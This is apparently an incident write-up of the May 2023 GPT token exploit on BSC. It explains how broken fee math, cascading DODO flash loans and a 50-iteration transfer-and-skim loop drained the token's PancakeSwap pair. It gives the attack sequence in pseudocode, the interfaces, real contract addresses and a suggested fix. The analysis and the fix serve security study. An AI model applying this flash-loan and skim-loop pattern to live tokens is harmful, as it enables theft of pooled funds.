# GPT Token Exploit — Cascading DODO Flash Loans + 50-Iteration skim() Loop

## Metadata
| Field | Value |
|---|---|
| Date | 2023-05-05 |
| Project | GPT Token |
| Chain | BSC |
| Loss | Address unconfirmed |
| Attacker | Address unconfirmed |
| Attack TX | Address unconfirmed |
| Vulnerable Contract | GPT Token: 0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3 |
| Block | Address unconfirmed |
| CWE | CWE-682 (Incorrect Calculation — fee mechanism allows skim exploitation) |
| Vulnerability Type | Broken Fee Mechanism + skim() Loop Reserve Drain |

## Summary
GPT token's transfer fee mechanism was broken such that 50 iterations of transferring 0.5 GPT followed by `pair.skim()` allowed the attacker to accumulate GPT tokens. This was executed using a cascading 5-oracle DODO flash loan, with BUSD→GPT and GPT→BUSD swaps sandwiching the skim loop to extract the price impact.

## Vulnerability Details
- **CWE-682**: Each tiny GPT transfer (0.5 tokens) to the pair triggered a fee calculation that accumulated residual GPT in the pair's balance above its reserves. After 50 iterations, `skim()` transferred this excess to the attacker. The broken fee math meant the excess grew proportional to the number of micro-transfers.

### On-Chain Original Code

Source: Bytecode Decompilation

```solidity
// File: GPT_decompiled.sol
    function transfer(address account, uint256 value) external returns (bool) {}  // ❌

// ...

    function setRateAddr(address account) external {}  // ❌

// ...

    function withdraw(address account, address recipient, uint256 shares) external {}  // ❌

// ...

    function allowance(address account, address recipient) external view returns (uint256) {}  // ❌

// ...

    function transferOwnship(address account) external {}  // ❌
```

## Attack Flow (from testExploit())
```solidity
// 1. oracle1.flashLoan → oracle2.flashLoan → oracle3.flashLoan
//    → oracle4.flashLoan → oracle5.flashLoan
//    → final DPPFlashLoanCall() callback:
// 2. pair.sync()   // reset reserves baseline
// 3. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
//       BUSD, 0, [BUSD→GPT], ...
//    )  // buy GPT
// 4. for (uint i = 0; i < 50; i++) {
//       GPT.transfer(address(pair), 0.5e18);   // micro-transfer triggers fee
//       pair.skim(address(this));               // collect excess
//    }
// 5. Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
//       GPT, 0, [GPT→BUSD], ...
//    )  // sell GPT
// 6. Repay all 5 flash loans in reverse order
```

## Interfaces from PoC
```solidity
interface IDPPOracle {
    function flashLoan(
        uint256 baseAmount, uint256 quoteAmount,
        address assetTo, bytes calldata data
    ) external;
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function skim(address to) external;
    function sync() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}
```

## Key Addresses
| Label | Address |
|---|---|
| GPT Token | 0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3 |
| BUSD | 0x55d398326f99059fF775485246999027B3197955 |
| PancakeRouter | 0x10ED43C718714eb63d5aA57B78B54704E256024E |
| DPPOracle1 | 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681 |
| DPPOracle2 | 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A |
| DPPOracle3 | 0x26d0c625e5F5D6de034495fbDe1F6e9377185618 |
| DPPOracle4 | 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476 |
| DPPOracle5 | 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d |
| GPT Pair | 0x77a684943aA033e2E9330f12D4a1334986bCa3ef |

## Root Cause
The GPT token's transfer fee calculation generated residual balance in the AMM pair on every micro-transfer, which `skim()` redistributed to the caller. The fee formula did not correctly account for tiny transfers, making iterative micro-transfer + skim loops profitable.

## Fix
```solidity
// Enforce minimum transfer amount and validate fee calculation:
function _transfer(address from, address to, uint256 amount) internal override {
    require(amount >= MIN_TRANSFER_AMOUNT, "Transfer too small");
    uint256 fee = amount * FEE_RATE / FEE_DENOMINATOR;
    require(fee > 0 || amount == 0, "Fee rounds to zero");
    super._transfer(from, address(this), fee);
    super._transfer(from, to, amount - fee);
}
```

## References
- 5-oracle DODO cascade: oracles 1-5 on BSC
- 50-iteration skim loop attack pattern